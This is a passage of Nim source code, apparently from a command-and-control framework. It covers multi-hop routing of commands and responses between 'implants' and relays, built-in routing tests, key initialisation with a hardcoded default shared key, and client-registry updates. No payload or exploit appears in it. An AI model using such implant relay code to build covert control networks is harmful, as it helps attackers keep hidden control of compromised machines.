        echo "🔐 ENCRYPTION STRATEGY:"
        echo "   🔑 Shared key: Inter-relay communication"
        echo "   🔐 Unique key: Final destination delivery"
        echo ""
        echo "🚀 =================================================="
        echo ""

# Create a test message for demonstration
proc createTestMessage*(msgType: RelayMessageType, fromID: string, payload: string = "test"): RelayMessage =
    result = createMessage(msgType, fromID, @[], payload)
    when defined debug:
        echo "[TEST] 🧪 Created test message:"
        echo "[TEST] 🧪 - Type: " & $msgType
        echo "[TEST] 🧪 - From: " & fromID
        echo "[TEST] 🧪 - ID: " & result.id
        echo "[TEST] 🧪 - Route: " & $result.route

# Test the complete system with various scenarios
proc testDistributedRoutingSystem*(): tuple[passed: int, failed: int, details: seq[string]] =
    result.passed = 0
    result.failed = 0
    result.details = @[]
    
    when defined debug:
        echo "[TEST] 🧪 ┌─────────── DISTRIBUTED ROUTING TESTS ───────────┐"
        echo "[TEST] 🧪 │ Running comprehensive system tests...           │"
        echo "[TEST] 🧪 └─────────────────────────────────────────────────┘"
    
    # Test 1: Forward message flow
    when defined debug:
        echo "[TEST] 🧪 Test 1: Forward message flow"
    
    let forwardMsg = createTestMessage(COMMAND, "IMPLANT-001", "test command")
    if forwardMsg.msgType == COMMAND and forwardMsg.fromID == "IMPLANT-001":
        result.passed += 1
        result.details.add("✅ Forward flow: message created")
        when defined debug:
            echo "[TEST] 🧪 ✅ Forward message test PASSED"
    else:
        result.failed += 1
        result.details.add("❌ Forward flow failed")
        when defined debug:
            echo "[TEST] 🧪 ❌ Forward message test FAILED"
    
    # Test 2: Response message flow (reverse routing)
    when defined debug:
        echo "[TEST] 🧪 Test 2: Response message flow"
    
    var responseMsg = createTestMessage(RESPONSE, "RELAY-ROOT", "command result")
    responseMsg.route = @["IMPLANT-001", "RELAY-DEEP", "RELAY-INTERMEDIATE", "RELAY-ROOT"]  # Simulate existing route
    
    # Test reverse routing logic
    let currentID = "RELAY-INTERMEDIATE"
    let prevHop = calculatePreviousHop(responseMsg.route, currentID)
    
    if prevHop.found and prevHop.previousHop == "RELAY-DEEP":
        result.passed += 1
        result.details.add("✅ Reverse routing: " & prevHop.previousHop)
        when defined debug:
            echo "[TEST] 🧪 ✅ Response routing test PASSED"
    else:
        result.failed += 1
        result.details.add("❌ Reverse routing failed")
        when defined debug:
            echo "[TEST] 🧪 ❌ Response routing test FAILED"
    
    # Test 3: Route validation
    when defined debug:
        echo "[TEST] 🧪 Test 3: Route validation"
    
    let validRoute = @["IMPLANT-001", "RELAY-DEEP", "RELAY-INTERMEDIATE"]
    let validation = validateRouteForReverse(validRoute, "RELAY-INTERMEDIATE")
    
    if validation.isValid:
        result.passed += 1
        result.details.add("✅ Route validation: " & validation.reason)
        when defined debug:
            echo "[TEST] 🧪 ✅ Route validation test PASSED"
    else:
        result.failed += 1
        result.details.add("❌ Route validation: " & validation.reason)
        when defined debug:
            echo "[TEST] 🧪 ❌ Route validation test FAILED"
    
    # Test 4: Message type detection
    when defined debug:
        echo "[TEST] 🧪 Test 4: Message type detection"
    
    let isResponseTest1 = isResponseMessage(RESPONSE)
    let isResponseTest2 = isResponseMessage(COMMAND)
    
    if isResponseTest1 and not isResponseTest2:
        result.passed += 1
        result.details.add("✅ Message type detection works")
        when defined debug:
            echo "[TEST] 🧪 ✅ Message type detection test PASSED"
    else:
        result.failed += 1
        result.details.add("❌ Message type detection failed")
        when defined debug:
            echo "[TEST] 🧪 ❌ Message type detection test FAILED"
    
    # Test 5: Loop prevention
    when defined debug:
        echo "[TEST] 🧪 Test 5: Loop prevention"
    
    let loopRoute = @["IMPLANT-001", "RELAY-A", "RELAY-B", "RELAY-A"]  # Loop!
    let loopValidation = validateRouteForReverse(loopRoute, "RELAY-A")
    
    # This should be valid (first occurrence of RELAY-A)
    if loopValidation.isValid:
        result.passed += 1
        result.details.add("✅ Loop prevention: handled correctly")
        when defined debug:
            echo "[TEST] 🧪 ✅ Loop prevention test PASSED"
    else:
        result.failed += 1
        result.details.add("❌ Loop prevention failed")
        when defined debug:
            echo "[TEST] 🧪 ❌ Loop prevention test FAILED"
    
    when defined debug:
        echo "[TEST] 🧪 ┌─────────── TEST RESULTS ───────────┐"
        echo "[TEST] 🧪 │ Passed: " & $result.passed & " │"
        echo "[TEST] 🧪 │ Failed: " & $result.failed & " │"
        echo "[TEST] 🧪 │ Total:  " & $(result.passed + result.failed) & " │"
        echo "[TEST] 🧪 └─────────────────────────────────────┘"
        
        for detail in result.details:
            echo "[TEST] 🧪 " & detail

# Performance monitoring for routing system
proc getRoutingPerformanceStats*(): tuple[avgRouteLength: float, maxRouteLength: int, routingEfficiency: float] =
    let stats = getAdvancedRoutingStats()
    result.avgRouteLength = stats.avgRouteLength
    result.maxRouteLength = stats.maxRouteLength
    result.routingEfficiency = if stats.totalMessages > 0: 1.0 - (float(stats.routingErrors) / float(stats.totalMessages)) else: 1.0
    
    when defined debug:
        echo "[PERF] 📊 Routing Performance Statistics:"
        echo "[PERF] 📊 - Average route length: " & $result.avgRouteLength & " hops"
        echo "[PERF] 📊 - Maximum route length: " & $result.maxRouteLength & " hops"
        echo "[PERF] 📊 - Routing efficiency: " & $(result.routingEfficiency * 100.0) & "%"

# Initialize the complete distributed routing system
proc initializeDistributedRoutingSystem*(implantID: string, sharedKey: string = "default_shared_key"): bool =
    when defined debug:
        echo "[INIT] 🚀 Initializing Distributed Routing System..."
    
    try:
        # Initialize key configuration
        initializeRelayKeys(implantID, sharedKey)
        
        # Validate system readiness
        let keyStatus = getKeyConfigStatus()
        if not keyStatus.hasShared:
            when defined debug:
                echo "[INIT] ❌ Shared key not initialized"
            return false
        
        when defined debug:
            echo "[INIT] ✅ Key system initialized"
            echo "[INIT] 🆔 Implant ID: " & implantID
            echo "[INIT] 🔑 Shared key: " & (if keyStatus.hasShared: "✅" else: "❌")
            echo "[INIT] 🔐 Unique key: " & (if keyStatus.hasUnique: "✅" else: "❌")
        
        # Test basic functionality
        let testResults = testDistributedRoutingSystem()
        if testResults.failed > 0:
            when defined debug:
                echo "[INIT] ⚠️ System tests failed: " & $testResults.failed & " failures"
            return false
        
        when defined debug:
            echo "[INIT] ✅ All system tests passed"
            echo "[INIT] 🎉 Distributed Routing System ready!"
        
        return true
        
    except:
        when defined debug:
            echo "[INIT] ❌ System initialization failed: " & getCurrentExceptionMsg()
        return false

# Update client ID in registry for confirmation protocol
proc updateClientId*(server: var RelayServer, oldId: string, newId: string): bool =
    when defined debug:
        echo "[REGISTRY] 🔄 === UPDATE CLIENT ID ==="
        echo "[REGISTRY] 🔄 Old ID: " & oldId
        echo "[REGISTRY] 🔄 New ID: " & newId
        echo "[REGISTRY] 🔄 Registry before: " & $server.clientRegistry.len & " clients"
    
    # Check if old ID exists in registry
    if not server.clientRegistry.hasKey(oldId):
        when defined debug:
            echo "[REGISTRY] 🔄 ❌ Old ID not found in registry"
            echo "[REGISTRY] 🔄 === END UPDATE CLIENT ID (NOT FOUND) ==="
        return false
    
    # Check if new ID already exists (should not happen)
    if server.clientRegistry.hasKey(newId):
        when defined debug:
            echo "[REGISTRY] 🔄 ⚠️ New ID already exists in registry - overwriting"
    
    # Get connection index from old ID
    let connectionIndex = server.clientRegistry[oldId]
    
    # Update the connection's clientID
    if connectionIndex < server.connections.len:
        server.connections[connectionIndex].clientID = newId
        when defined debug:
            echo "[REGISTRY] 🔄 ✅ Updated connection " & $connectionIndex & " clientID to: " & newId
    
    # Update registry mapping
    server.clientRegistry.del(oldId)
    server.clientRegistry[newId] = connectionIndex
    
    when defined debug:
        echo "[REGISTRY] 🔄 ✅ Registry updated successfully"
        echo "[REGISTRY] 🔄 Registry after: " & $server.clientRegistry.len & " clients"
        echo "[REGISTRY] 🔄 New mapping: " & newId & " → connection " & $connectionIndex
        echo "[REGISTRY] 🔄 === END UPDATE CLIENT ID (SUCCESS) ==="
    
    return true 